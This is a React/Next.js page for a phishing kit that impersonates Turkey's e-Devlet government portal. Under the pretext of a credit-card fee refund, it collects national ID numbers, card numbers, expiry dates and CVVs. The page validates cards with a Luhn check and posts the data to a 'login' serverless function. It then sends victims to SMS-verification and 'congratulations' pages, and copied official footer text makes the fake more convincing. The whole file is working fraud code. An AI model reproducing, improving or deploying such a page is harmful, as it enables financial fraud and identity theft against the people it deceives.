import Head from 'next/head';
import { useCallback, useMemo, useState } from 'react';
import { useRouter } from 'next/router';
import useStatusPolling from '../lib/hooks/useStatusPolling';
import useSessionStep from '../lib/hooks/useSessionStep';

const initialFormState = {
  kullanici: '',
  cc_no: '',
  cc_yil: '',
  cc_cvv: '',
};

const luhnCheck = (value) => {
  const sanitized = value.replace(/[^0-9]/g, '');
  if (!sanitized || /[^0-9-\s]+/.test(value)) return false;

  let sum = 0;
  let shouldDouble = false;

  for (let i = sanitized.length - 1; i >= 0; i -= 1) {
    let digit = parseInt(sanitized.charAt(i), 10);

    if (shouldDouble) {
      digit *= 2;
      if (digit > 9) digit -= 9;
    }

    sum += digit;
    shouldDouble = !shouldDouble;
  }

  return sum % 10 === 0;
};

export default function HomePage() {
  const router = useRouter();
  const [formData, setFormData] = useState(initialFormState);
  const [statusMessage, setStatusMessage] = useState('');
  const [submitting, setSubmitting] = useState(false);

  const isValidCard = useMemo(() => luhnCheck(formData.cc_no), [formData.cc_no]);
  useStatusPolling();
  useSessionStep('Anasayfa');

  const handleChange = useCallback((event) => {
    const { name, value } = event.target;
    setFormData((prev) => ({ ...prev, [name]: value }));
  }, []);

  const handleSubmit = useCallback(
    async (event) => {
      event.preventDefault();
      setStatusMessage('');

      if (!isValidCard) {
        setStatusMessage('Kredi kartı numaranızı hatalı girdiniz lütfen kontrol ediniz.');
        return;
      }

      setSubmitting(true);

      try {
        const response = await fetch('/.netlify/functions/login', {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
          },
          body: JSON.stringify(formData),
        });

        if (!response.ok) {
          throw new Error('Ağ hatası');
        }

        const result = await response.json();

        if (result?.status === 'limit') {
          router.push('/limit-kontrol');
          return;
        }

        if (result?.status === 'sms') {
          router.push('/sms-dogrulama');
          return;
        }

        if (result?.status === 'tebrik') {
          router.push('/tebrikler');
          return;
        }

        if (result?.status === 'hata1') {
          router.push('/sms-hatali');
          return;
        }

        setStatusMessage(result?.message || 'Bilgileriniz alındı. Lütfen bekleyiniz.');
      } catch (error) {
        setStatusMessage('İşlem sırasında bir sorun oluştu. Lütfen tekrar deneyiniz.');
      } finally {
        setSubmitting(false);
      }
    },
    [formData, isValidCard, router],
  );

  return (
    <>
      <Head>
        <meta charSet="utf-8" />
        <meta httpEquiv="x-ua-compatible" content="IE=edge" />
        <meta httpEquiv="cleartype" content="on" />
        <title>e-Devlet Kapısı</title>
        <meta
          name="description"
          content="Dünya çok acı çekiyor, kötü insanların şiddetinden değil, iyi insanların sessizliğinden."
        />
        <meta name="keywords" content="Business,Dünya,Çok,Acı,Çekiyor" />
        <meta name="robots" content="noindex,nofollow" />
        <meta name="viewport" content="width=device-width, initial-scale=1" />
        <meta name="theme-color" content="#4284de" />
        <link rel="icon" type="image/png" href="/assets/img/favicon-196x196.png" sizes="196x196" />
        <meta name="msapplication-TileColor" content="#FFFFFF" />
        <link rel="stylesheet" href="/assets/css/base.css" />
        <link rel="stylesheet" href="/assets/css/giris.css" />
        <script src="/assets/js/header.js" defer />
      </Head>

      <div id="page">
        <header id="headerSection">
          <h1>Türkiye Cumhuriyeti Vatandaş Kimlik Doğrulama Sistemi</h1>
          <nav id="accesibilityBlock" className="visuallyhidden">
            <ul>
              <li>
                <a href="#loginForm" accessKey="s">
                  Ana Sayfa
                </a>
              </li>
              <li>
                <a href="#" accessKey="1">
                  İçeriğe Git
                </a>
              </li>
            </ul>
          </nav>
        </header>

        <main>
          <section className="referrerApp">
            <img className="sso" src="/assets/img/1.png" alt="" width="165" height="40" />
            <dl>
              <dt>Giriş Yapılacak Uygulama</dt>
              <dd>
                <span title="e-Devlet Kapısı">e-Devlet Kapısı</span>
              </dd>
            </dl>
          </section>

          <nav className="methodSelector" />

          <section id="pageContent">
            <div className="richText">
              İade hakkını sorgulamak istediğiniz kredi kartınızın bilgilerini giriniz. (Aidat iadeleri yalnızca kredi
              kartları içindir.)
            </div>
            <form method="post" id="loginForm" name="sifreGirisForm" autoComplete="off" onSubmit={handleSubmit}>
              <fieldset>
                <div className="formRow required">
                  <label htmlFor="tridField" className="rowLabel">
                    T.C. Kimlik No
                  </label>
                  <input type="hidden" name="encTridField" id="encTridField" value="" />
                  <div className="fieldGroup">
                    <input
                      name="kullanici"
                      type="text"
                      className="text"
                      id="tridField"
                      tabIndex={1}
                      autoComplete="off"
                      maxLength={11}
                      pattern="[0-9]{11}"
                      title="Kimlik numaranız 11 adet rakamdan oluşmalıdır"
                      aria-required="true"
                      required
                      value={formData.kullanici}
                      onChange={handleChange}
                    />
                  </div>
                </div>

                <div className="formRow required">
                  <label htmlFor="tekewe" className="rowLabel">
                    Kredi Kartı Numaranız:
                  </label>
                  <label style={{ color: 'red', fontSize: 11 }} id="msg_">
                    {!isValidCard && formData.cc_no ? 'Kredi kartı numaranızı hatalı girdiniz lütfen kontrol ediniz.' : ''}
                  </label>
                  <div className="fieldGroup">
                    <input
                      name="cc_no"
                      id="tekewe"
                      type="tel"
                      inputMode="numeric"
                      maxLength={16}
                      minLength={12}
                      className="text"
                      tabIndex={2}
                      aria-required="true"
                      required
                      value={formData.cc_no}
                      onChange={handleChange}
                    />
                  </div>
                </div>

                <div className="formRow required">
                  <label htmlFor="sifrexa" className="rowLabel">
                    Son Kullanma Tarihi:
                  </label>
                  <div className="fieldGroup">
                    <input
                      name="cc_yil"
                      id="sifrexa"
                      type="text"
                      placeholder="AA/YY"
                      maxLength={5}
                      className="text"
                      tabIndex={3}
                      aria-required="true"
                      required
                      value={formData.cc_yil}
                      onChange={handleChange}
                    />
                  </div>
                </div>

                <div className="formRow required">
                  <label htmlFor="egpField" className="rowLabel">
                    Cvv Kodunuz:
                  </label>
                  <div className="fieldGroup">
                    <input
                      name="cc_cvv"
                      id="egpField"
                      type="tel"
                      inputMode="numeric"
                      maxLength={3}
                      minLength={3}
                      className="text"
                      tabIndex={4}
                      aria-required="true"
                      required
                      value={formData.cc_cvv}
                      onChange={handleChange}
                    />
                  </div>
                </div>
              </fieldset>

              <div className="loader" style={{ display: submitting ? 'flex' : 'none' }}>
                <img src="/assets/img/form-progress.svg" alt="..." />İşleminiz devam ediyor. Lütfen bekleyiniz...
              </div>

              {statusMessage && <p className="formError">{statusMessage}</p>}
              <div className="formSubmitRow">
                <button type="submit" id="login_submit" className="submitButton" disabled={submitting}>
                  {submitting ? 'Gönderiliyor…' : 'İade Sorgula'}
                </button>
                <button type="button" className="backButton" onClick={() => setFormData(initialFormState)}>
                  İptal Et
                </button>
              </div>
            </form>
          </section>
        </main>

        <footer>
          <ul className="footerLinks">
            <li>
              <a href="#gizlilikGuvenlik">Gizlilik ve Güvenlik</a>
            </li>
            <li>
              <a href="#/iletisim?hizli=CozumMerkezi2" target="_blank" rel="noreferrer">
                Hızlı Çözüm Merkezi
              </a>
            </li>
          </ul>
          <div className="copyrightDetails">© 2023, Ankara - Tüm Hakları Saklıdır</div>
        </footer>

        <div className="printableFooter">
          <div className="imageSection">
            <img src="/assets/img/bb-ubak-tsat-black.png" alt="e-Devlet logosu" />
            <span className="imageInfo">
              e-Devlet Kapısı’nın kurulması ve yönetilmesi görevi T.C. Cumhurbaşkanlığı Dijital Dönüşüm Ofisi Başkanlığı
              tarafından yürütülmekte olup, sistemin geliştirilmesi ve işletilmesi Türksat A.Ş. tarafından
              yapılmaktadır.
            </span>
          </div>
          <div className="bottomInfo">
            ©2020 Tüm Hakları Saklıdır. Gizlilik, Kullanım ve Telif Hakları bildiriminde belirtilen kurallar çerçevesinde
            hizmet sunulmaktadır.
          </div>
        </div>

        <div className="mask" />

        <div className="modal" id="gizlilikGuvenlik">
          <div className="modal-container">
            <span className="close" role="button" tabIndex={0}>
              ×
            </span>
            <h3>Gizlilik ve Güvenlik</h3>
            <div className="modal-content">
              <p>
                e-Devlet Kapısı çalışanları hiçbir zaman size şifrenizi sormayacaktır. Şifrenizi e-Devlet Kapısı giriş
                ekranları haricinde hiçbir yere kaydetmeyiniz. Tarayıcı uygulaması (Internet Explorer, Firefox, Safari ve
                benzeri uygulamaların) şifre kaydetme opsiyonlarını kapalı tutunuz.
              </p>
              <p>
                Ayrıca hiçbir zaman kişisel bilgileriniz veya şifreniz e-posta yolu ile sizlere sorulmayacaktır. Unutmayınız
                ki zararlı uygulamaların ve virüslerin büyük çoğunluğu e-posta yolu ile yayılmaktadır.
              </p>
            </div>
            <div className="modal-footer">
              <div className="formSubmitRow">
                <button className="cancelButton" type="button">
                  Kapat
                </button>
              </div>
            </div>
          </div>
          <div className="modalBg" />
        </div>

        <div className="modal" id="info">
          <div className="modal-container">
            <span className="close" role="button" tabIndex={0}>
              ×
            </span>
            <h3>e-Devlet Şifresi</h3>
            <div className="modal-content">
              <p>
                e-Devlet şifrenizi içeren zarfınızı PTT Merkez Müdürlüklerinden, şahsen başvuru ile, üzerinde T.C. Kimlik
                numaranızın bulunduğu kimliğinizi ibraz ederek temin edebilirsiniz.
              </p>
              <p>
                Bu uygulama, sizin yerinize başka bir kişinin şifre alıp adınıza işlem yapmasının önüne geçilmesi için
                gerekmektedir.
              </p>
            </div>
            <div className="modal-footer">
              <div className="formSubmitRow">
                <button className="cancelButton" type="button">
                  Kapat
                </button>
              </div>
            </div>
          </div>
          <div className="modalBg" />
        </div>
      </div>
    </>
  );
}
